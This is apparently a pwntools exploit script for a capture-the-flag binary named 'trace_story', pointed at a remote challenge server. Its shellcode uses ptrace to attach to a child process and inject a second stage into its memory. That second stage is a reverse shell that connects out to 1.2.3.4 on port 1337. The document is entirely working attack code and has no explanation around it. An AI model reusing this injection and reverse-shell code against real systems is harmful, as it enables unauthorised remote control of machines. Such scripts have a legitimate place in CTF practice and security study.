from pwn import *
BINARY_NAME = './trace_story'
exe = context.binary = ELF(BINARY_NAME)

PTRACE_GETREGS = 12
PTRACE_ATTACH = 16
PTRACE_POKETEXT = 4
PTRACE_CONT = 7
SYS_PTRACE = 101
PTRACE_DETACH = 17

TARGET = 0x401848 # just after sleep

def exploit(s):
    child_pid = int(s.recvline().strip().split(b' ')[-1])
    print(f'{child_pid = }')
    s.recvline()

    stage2 = asm(shellcraft.connect('1.2.3.4', 1337) + shellcraft.dupsh())

    code = f'''
        mov r15, rax

        mov rax, {SYS_PTRACE}
        mov rdi, {PTRACE_ATTACH}
        mov rsi, {child_pid}
        xor rdx, rdx
        xor r10, r10
        syscall

        xor rbx, rbx
    spin_loop:
        add rbx, 1
        cmp rbx, 0x3133337
        jnz spin_loop

        xor rbx, rbx
    poke_loop:
        mov rax, {SYS_PTRACE}
        mov rdi, {PTRACE_POKETEXT}
        mov rsi, {child_pid}
        mov rdx, {TARGET}
        add rdx, rbx
        lea r10, [r15 + 0x100]
        mov r10, qword ptr [r10 + rbx]
        syscall

        add rbx, 8
        cmp rbx, {len(stage2)}
        jl poke_loop

        mov rax, {SYS_PTRACE}
        mov rdi, {PTRACE_DETACH}
        mov rsi, {child_pid}
        xor rdx, rdx
        xor r10, r10
        syscall

    inf_loop:
        jmp inf_loop
    '''

    code = asm(code)
    code += b'\x90' * (0x100 - len(code))
    code += stage2

    # pause()
    s.sendline(code)
    s.interactive()

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process(BINARY_NAME)
        libc = exe.libc
    else:
        s = remote('0.cloud.chals.io', 15148)
        libc = exe.libc
    exploit(s)

